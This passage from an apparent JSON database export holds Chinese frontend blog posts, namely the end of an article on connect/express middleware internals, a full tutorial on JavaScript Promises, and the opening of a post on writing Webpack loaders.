\u003c/span\u003e{\n\n    \u003cspan class=\"hljs-comment\"\u003e// next callback\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e layer = stack[index++];\n\n    \u003cspan class=\"hljs-comment\"\u003e// all done 这个不能去\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!layer) {\n      defer(done, err);\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e;\n    }\n\n    \u003cspan class=\"hljs-comment\"\u003e// route data\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e path = parseUrl(req).pathname || \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e;\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e route = layer.route;\n\n    \u003cspan class=\"hljs-comment\"\u003e// skip this layer if the route doesn't match\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (path.toLowerCase().substr(\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, route.length) !== route.toLowerCase()) {\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e next(err);\n    }\n\n\n    \u003cspan class=\"hljs-comment\"\u003e// call the layer handle\u003c/span\u003e\n    call(layer.handle, route, err, req, res, next);\n  }\n\n  next();\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e简化后我们可以看到, 其实next是个递归, 只要符合条件它会不停地调用自身, 也就是说只要你在中间件里调用了next它会遍历stack寻找中间件如果找到了就执行, 如果没找到就defer(done), 注意proto.handle定义了一个index, 这是寻找中间件的一个索引, next一直需要用到. 这里无关紧要的函数就不提了, 比如\u003ccode\u003egetProtohost\u003c/code\u003e, 比如\u003ccode\u003ecall\u003c/code\u003e.\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eapp.listen\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eapp.listen\u003c/code\u003e其实也很简单了, 无法是新建一个\u003ccode\u003ehttp.Server\u003c/code\u003e而已, 代码如下:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003eproto.listen = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003elisten\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e server = http.createServer(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e);\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e server.listen.apply(server, \u003cspan class=\"hljs-built_in\"\u003earguments\u003c/span\u003e);\n};\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e结束\u003c/h2\u003e\n\u003cp\u003e说到这里差不多快结束了, 我们其实可以知道, connect/express的中间件模型是这样的:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003ehttp.createServer(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003ereq, res\u003c/span\u003e) \u003c/span\u003e{\n  m1 (req, res) {\n    m2 (req, res) {\n      m3 (req, res) {}\n    }\n  }\n})\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e当我们调用next的时候才会继续寻找中间件并调用. 这样写出来我自己好像也清楚了很多(逃\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2018/1/5/160c4c2accff918c?w=897\u0026amp;h=626\u0026amp;f=png\u0026amp;s=177013\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n","buildTime":"1515151132.3671","__v":0}
{"_id":{"$oid":"5a4f5f6218646e1ee8be98fe"},"id":"5a4e14dc518825734107b672","author":{"$oid":"5a4f5f6218646e1ee8be98e6"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"Promise一些小总结","meta":{"likeCount":0},"tag":["前端框架","前端","Promise"],"comment":[],"shortContent":"在前端开发中，有个很熟悉的词叫做“回调”，在处理一些异步的函数的时候，回调被广泛应用，但是大量用回调来编程，会出现嵌套层级过多，代码风格不规范，不清晰的问题。“Promise/A+规范”是一种很方便的异步编程方式。 1. 构建promise对象 Promise类似于 XMLHt…","content":"\u003cp\u003e在前端开发中，有个很熟悉的词叫做“回调”，在处理一些异步的函数的时候，回调被广泛应用，但是大量用回调来编程，会出现嵌套层级过多，代码风格不规范，不清晰的问题。“\u003cstrong\u003ePromise/A+规范\u003c/strong\u003e”是一种很方便的异步编程方式。\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 class=\"heading\"\u003e使用promise进行编程有哪些好处？\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cul\u003e\n\u003cli\u003e将复杂的异步处理轻松地进行模式化\u003c/li\u003e\n\u003cli\u003e代码更清晰\u003c/li\u003e\n\u003cli\u003e异常处理更方便\u003c/li\u003e\n\u003cli\u003e代码链式操作，\u003cstrong\u003e爽\u003c/strong\u003e！\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003e先来一段简单的promise的代码：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar promise = getAsyncPromise(\u003cspan class=\"hljs-string\"\u003e\"fileA.txt\"\u003c/span\u003e); \npromise.then(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(result){\n// 获取文件内容成功时的处理\n}).catch(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(error){\n// 获取文件内容失败时的处理\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e通过这个代码，是不是觉得promise异步编程很清晰？\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e下面我详细介绍下promise实用的方法。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003chr\u003e\n\u003ch2 class=\"heading\"\u003ePromise 简介\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e1. 构建promise对象\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003ePromise类似于 XMLHttpRequest ,从构造函数 Promise 来创建一个新建新 promise 对 象作为接口。\u003c/li\u003e\n\u003cli\u003e要想创建一个promise对象、可以使用 new 来调用 Promise 的构造器来进行实例化。如下：\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar promise = new Promise(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(resolve, reject) { \n// 异步处理\n// 处理结束后、调用resolve 或 reject\n});\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e2. 常用的方法\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e对通过new生成的promise对象为了设置其值在 resolve(成功) / reject(失败)时调用的回调函数 可以使用 promise.then() 实例方法。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003epromise.then(onFulfilled, onRejected)\n\n//resolve(成功)时 onFulfilled 会被调用\n//reject(失败)时onRejected 会被调用\n//onFulfilled 、 onRejected 两个都为可选参数。\n\u003c/code\u003e\u003c/pre\u003e\u003cul\u003e\n\u003cli\u003epromise.then成功和失败时都可以使用。另外在只想对异常进行处理时可以采用promise.then(undefined, onRejected),这种方式,只指定reject时的回调函数即可。 不过这种情况下 promise.catch(onRejected)￼ 应该是个更好的选择。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003epromise.catch(onRejected)\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e3. 静态方法\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e包括 Promise.all() 还有 Promise.resolve() 等在内,主要都是一些对Promise进行操作的 辅助方法。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 class=\"heading\"\u003e4. 来个栗子\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003easyncFunction\u003c/span\u003e\u003c/span\u003e() {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e new Promise(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (resolve, reject) { //①\n    \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e () {\n        resolve(\u003cspan class=\"hljs-string\"\u003e'Async Hello world'\u003c/span\u003e); }, 16); //②\n    }); \n}\nasyncFunction().then(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (value) { console.log(value); // =\u0026gt; \u003cspan class=\"hljs-string\"\u003e'Async Hello world'\u003c/span\u003e\n}).catch(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (error) { console.log(error);\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e栗子说明：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003enew Promise构造器之后,会返回一个promise对象\u003c/li\u003e\n\u003cli\u003e为promise对象用设置 .then 调用返回值时的回调函数。\u003c/li\u003e\n\u003cli\u003e这个函数会返回promise对象,对于这个promise对象,我们调用的 方法来设置resolve后的回调函数,catch方法来设置发生错误时的回调函数。\u003c/li\u003e\n\u003cli\u003e在这种情况下catch的回调函数并不会被执行(因为promise返回了resolve), 不过如果运行环境没有提供setTimeout函数的话,那么上面代码在执行中就会产生异常,在catch中设置的回调函数就会被执行。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cstrong\u003e上面的代码也也可以不用catch方法，用then（resolve, reject）的形式(链式操作时最好用catch，可以统一捕捉异常)：\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003easyncFunction().then(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (value) { console.log(value);\n}, \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (error) { console.log(error);\n});\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003ePromise 状态详解\u003c/h2\u003e\n\u003cp\u003e大致的了解promise处理流程，单独介绍一下promise状态\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e1. 大致三个状态\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eresolve(成功)时。此时会调用 onFulfilled\u003c/li\u003e\n\u003cli\u003ereject(失败)时。此时会调用 onRejected\u003c/li\u003e\n\u003cli\u003e既不是resolve也不是reject的状态。也就是promise对象刚被创建后的初始化状态等\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"此处输入图片的描述\" src=\"https://user-gold-cdn.xitu.io/2018/1/4/160c1030ec7dd190?w=1003\u0026amp;h=1015\u0026amp;f=png\u0026amp;s=84212\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e*注意：从Pending转换为Fulfilled或Rejected之后, 这个promise对象的状 态就不会再发生任何变化。\u003c/p\u003e\n\u003cp\u003e当promise的对象状态发生变化时,用 .then 来定义只会被调用一次的函数。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e编写Promise代码：\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e1. 创建promise对象\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003enew Promise(fn) 返回一个promise对象\u003c/li\u003e\n\u003cli\u003e在 fn 中指定异步等处理\n• 处理结果正常的话,调用 resolve(处理结果值)\n• 处理结果错误的话,调用 reject(Error对象)\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 class=\"heading\"\u003e来个XHR的promise对象的栗子\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e getURL(URL) {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e new Promise(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (resolve, reject) {\n        var req = new XMLHttpRequest();  //栗子就不做ie兼容了\n        req.open(\u003cspan class=\"hljs-string\"\u003e'GET'\u003c/span\u003e, URL, \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e); \n        req.onload = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e () {\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (req.status === 200) { \n                resolve(req.responseText);\n            } \n            \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n                reject(new Error(req.statusText));\n            } \n        };\n        req.onerror = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e () { \n            reject(new Error(req.statusText)）;\n        };\n        req.send(); \n    });\n}\n// 运行示例\nvar URL = \u003cspan class=\"hljs-string\"\u003e\"http://httpbin.org/get\"\u003c/span\u003e; \ngetURL(URL).then(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e onFulfilled(value) {\nconsole.log(value); }).catch(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e onRejected(error) {\nconsole.error(error); });\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003e栗子说明：\u003c/strong\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003egetURL 只有在通过XHR取得结果状态为200时才会调用 resolve - 也就是只有数据取 得成功时,而其他情况(取得失败)时则会调用 reject 方法。\u003c/li\u003e\n\u003cli\u003eresolve(req.responseText) 在response的内容中加入了参数。 resolve方法的参数并没有特 别的规则,基本上把要传给回调函数参数放进去就可以了。 ( then 方法可以接收到这 个参数值)\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 class=\"heading\"\u003e6. 编写promise对象处理方法\u003c/h3\u003e\n\u003cp\u003e让我们在实际中使用一下刚才创建的返回promise对象的函数\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003egetURL(\u003cspan class=\"hljs-string\"\u003e\"http://example.com/\"\u003c/span\u003e); // =\u0026gt; 返回promise对象\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e为promise对象添加处理方法主要有以下两种:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003epromise对象被 resolve 时的处理(onFulfilled)\u003c/li\u003e\n\u003cli\u003epromise对象被 reject时的处理(onRejected)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003egetURL(URL).then(onFulfilled, onRejected); //纯\u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e写法\ngetURL(URL).then( onFulfilled).catch( onRejected);  // \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e chatch写法\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003e注：一般说来,使用 .catch 来将resolve和reject处理分开来写是比较推荐的做法, 这两者的 区别会在then和catch的区别中再做详细介绍。\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 class=\"heading\"\u003e详解promise\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e1. 使用 Promise.resolve\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003ePromise.resolve(value) 可以认为是 new Promise() 方法的快捷方式。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e//比如 Promise.resolve(42); 可以认为是以下代码的语法糖。\nnew Promise(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(resolve){ \n    resolve(42);\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在这段代码中的 resolve(42);会让这个promise对象立即进入确定(即resolved)状态,并将 42 传递给后面then里所指定的 onFulfilled 函数。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ePromise.resolve(42).then(\n    \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (value) {\n        console.log(value)  //42\n    }\n);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003e注\u003c/strong\u003e：Promise.resolve作为newPromise()的快捷方式,在进行promise对象的初始化或者编写 测试代码的时候都非常方便。\u003c/p\u003e\n\u003chr\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003ePromise.resolve方法另一个作用就是将thenable对象转换为promise对象。\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e**thenable对象**：简单来说它就是一个非常类似promise的东西(*就像我们有时称具有.length方法的非数组对象为Arraylike一样,thenable指的是一个具有.then 方法的对象*。)   \n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e最简单的例子就是jQuery.ajax(),它的返回值就是thenable的(因为 jQuery.ajax()的返回值是jqXHRObject对象,这个对象具有 .then 方法)\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e用Promise.resolve来转换为一个promise对象。变成了promse对象的话,就能直接使用 then 或者 catch等这些在ES6Promises里定\n义的方法了。\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar promise = Promise.resolve(\n    $.ajax(\u003cspan class=\"hljs-string\"\u003e'/json/comment.json'\u003c/span\u003e)\n) // =\u0026gt; promise对象 \n\npromise.then(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(value){\n    console.log(value); \n});\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003e总结：简单总结一下 Promise.resolve 方法的话,可以认为它的作用就是将传递给它的参数填 充(Fulfilled)到promise对象后并返回这个promise对象。\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch3 class=\"heading\"\u003e2. 使用 Promise.reject\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003ePromise.reject(error) 是和 Promise.resolve(value) 类似的静态方法,是 new Promise() 方 法的快捷方式。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003enew Promise(\n    \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (resolve,reject) { \n        reject(new Error(\u003cspan class=\"hljs-string\"\u003e\"出错了\"\u003c/span\u003e));\n    }\n);\n// 是Promise.reject(newError(\u003cspan class=\"hljs-string\"\u003e\"出错了\"\u003c/span\u003e))的语法糖。\n//如下:\nPromise.reject(new Error(\u003cspan class=\"hljs-string\"\u003e\"BOOM!\"\u003c/span\u003e)).catch(\n    \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(error){ \n        console.error(error);\n    }\n);\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e上一篇写了一部分，再写一些关于promise的笔记\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003ePromise.then() \u0026amp;\u0026amp;链式写法\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003epromise可以写成方法链的形式\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eaPromise.then(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e taskA(value) { \n// task A\n}).then(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e taskB(vaue){\n// task B\n}).catch(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e onRejected(error){ //最后catch 统一捕捉异常\nconsole.log(error);\n});\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e来段代码，看下链式操作的执行流程\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003etaskA\u003c/span\u003e\u003c/span\u003e() { \n   console.log(\u003cspan class=\"hljs-string\"\u003e\"Task A\"\u003c/span\u003e);\n}\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003etaskB\u003c/span\u003e\u003c/span\u003e() {\n   console.log(\u003cspan class=\"hljs-string\"\u003e\"Task B\"\u003c/span\u003e); \n}\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e onRejected(error) { \n   console.log(\u003cspan class=\"hljs-string\"\u003e\"Catch Error: A or B\"\u003c/span\u003e, error);\n}\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efinalTask\u003c/span\u003e\u003c/span\u003e() {\n   console.log(\u003cspan class=\"hljs-string\"\u003e\"Final Task\"\u003c/span\u003e); \n}\nvar promise = Promise.resolve(); \npromise.then(taskA)\n       .then(taskB)\n       .catch(onRejected)\n       .then(finalTask);\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面这段代码的执行流程如下图：\n\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"此处输入图片的描述\" src=\"https://user-gold-cdn.xitu.io/2018/1/4/160c1030ec7dd190?w=1003\u0026amp;h=1015\u0026amp;f=png\u0026amp;s=84212\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e注释：\u003c/strong\u003e .cntch() 可以捕捉 taskA taskB出现的异常，但是 onRejected、finalTask这两个后面没有catch捕捉了，所以这两个函数出现问题不会被捕捉到。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e用then、catch 链式写法，要比纯then写法好！！\u003c/strong\u003e\n\u003cul\u003e\n\u003cli\u003ecatch 可以捕捉到resolve函数里面的错误，有时候我可以主动在resolve函数里throw一个错误或者返回一个Rejected状态的promise对象（推荐后者）；\u003c/li\u003e\n\u003cli\u003e链式操作代码更简洁\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch3 class=\"heading\"\u003ePromise链式写法中参数如何传递\u003c/h3\u003e\n\u003cp\u003e前面例子中的Task都是相互独立的,只是被简单调用而已。这时候如果 Task A 想给 Task B 传递一个参数，那就是在 Task A 中 return 的返回值,会在 Task B 执行时传给它。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e doubleUp(value) { \n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e value * 2;\n}\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e increment(value) {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e value + 1; \n}\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e output(value) { \n    console.log(value);\n}\nvar promise = Promise.resolve(1); \npromise\n.then(increment) \n.then(doubleUp) \n.then(output) \n.catch(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(error){\n    ￼￼￼// promise chain中出现异常的时候会被调用\n    console.error(error); \n});\n\n 1. Promise.resolve(1); 传递 1 给 increment 函数\n 2. 函数 increment 对接收的参数进行 +1 操作并返回(通过 \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e ) 3. 这时参数变为2,并再次传给 doubleUp 函数\n 3. 最后在函数 output 中打印结果\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e**注：**每个方法中return的值不仅只局限于字符串或者数值类型,也可以是对象或者promise 对象等复杂类型。\u003c/p\u003e\n\u003col start=\"4\"\u003e\n\u003cli\u003ereturn的值会由Promise.resolve进行相应的包装处理,因此不回调函数中会返回一个什么样的值,最终的结果都是返回一个新创建的promise对象。\u003c/li\u003e\n\u003c/ol\u003e\n\u003chr\u003e\n\u003ch3 class=\"heading\"\u003ePromise.catch 的一些小问题\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eIE8 兼容问题catch是ECMAScrip3中保留字是不能作为对象的属性名使用的（ie8大概是基于es3实现的）可以用Promise['catch']来调用（不过很多压缩、打包工具自带转换功能，还不错）\u003c/li\u003e\n\u003c/ol\u003e\n\u003chr\u003e\n\u003ch3 class=\"heading\"\u003ePromise处理多个异步任务，promise.all 上场\u003c/h3\u003e\n\u003cp\u003ePromise.all 接收一个promise对象的数组作为参数,当这个数组里的所有promise对象 全部变为resolve或reject状态的时候,它才会去调用 .then 方法。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// `delay`毫秒后执行resolve \n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e timerPromisefy(delay) {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e new Promise(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (resolve) {\n        \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e () {\n            resolve(delay); }, delay\n        );\n    }); \n}\n\nvar startDate = Date.now();\n// 所有promise变为resolve后程序退出 \nPromise.all([\n    timerPromisefy(1),\n    timerPromisefy(32), \n    timerPromisefy(64), \n    timerPromisefy(128)\n]).then(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (values) { \n    console.log(Date.now() - startDate + \u003cspan class=\"hljs-string\"\u003e'ms'\u003c/span\u003e); // 約128ms\n    console.log(values); // [1,32,64,128]\n    }\n);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e**注：**从总用时120ms来看，传递给Promise.all的promise并不是一个个的顺序执行的,而是 同时开始、并行执行的。\u003c/p\u003e\n\u003chr\u003e\n\u003ch3 class=\"heading\"\u003ePromise处理多个异步任务，Promise.race 上场\u003c/h3\u003e\n\u003cp\u003e它的使用方法和Promise.all一样,接收一个promise对象数组为参数\u003c/p\u003e\n\u003cp\u003ePromise.all 在接收到的所有的对象promise都变为 FulFilled 或者 Rejected 状态之后才会继续进行后面的处理,与之相对的是Promise.race 只要有一个promise对象进入FulFilled或者Rejected状态的话,就会继续进行后面的处理。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ePromise.race([\ntimerPromisefy(1), \ntimerPromisefy(32), \ntimerPromisefy(64), \ntimerPromisefy(128)\n]).then(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (value) { \n    console.log(value); // =\u0026gt; 1 只打印出一个最先出结果的\n});\n\n\u003c/code\u003e\u003c/pre\u003e","buildTime":"1515151106.909","__v":0}
{"_id":{"$oid":"5a4f5f6218646e1ee8be98ff"},"id":"5a4f3791f265da3e3f4c7ee6","author":{"$oid":"5a4b76d92239bd131cd79f36"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/20/1607259d52144ee4?w=1348\u0026h=845\u0026f=jpeg\u0026s=183464"],"screenShot":null}],"title":"深入Webpack-编写Loader","meta":{"likeCount":0},"tag":["Webpack","CSS","NPM","API"],"comment":[],"shortContent":"Loader 就像是一个翻译员，能把源文件经过转化后输出新的结果，并且一个文件还可以链式的经过多个翻译员翻译。 可以看出以上的处理过程需要有顺序的链式执行，先 sass-loader 再 css-loader 再 style-loader。 由上面的例子可以看出：一个 Load…","content":"\u003cp\u003eLoader 就像是一个翻译员，能把源文件经过转化后输出新的结果，并且一个文件还可以链式的经过多个翻译员翻译。\u003c/p\u003e\n\u003cp\u003e以处理 SCSS 文件为例：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eSCSS 源代码会先交给 sass-loader 把 SCSS 转换成 CSS；\u003c/li\u003e\n\u003cli\u003e把 sass-loader 输出的 CSS 交给 css-loader 处理，找出 CSS 中依赖的资源、压缩 CSS 等；\u003c/li\u003e\n\u003cli\u003e把 css-loader 输出的 CSS 交给 style-loader 处理，转换成通过脚本加载的  JavaScript 代码；\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e可以看出以上的处理过程需要有顺序的链式执行，先 sass-loader 再 css-loader 再 style-loader。\n以上处理的 Webpack 相关配置如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = {\n  \u003cspan class=\"hljs-attr\"\u003emodule\u003c/span\u003e: {\n    \u003cspan class=\"hljs-attr\"\u003erules\u003c/span\u003e: [\n      {\n        \u003cspan class=\"hljs-comment\"\u003e// 增加对 SCSS 文件的支持\u003c/span\u003e\n        test: \u003cspan 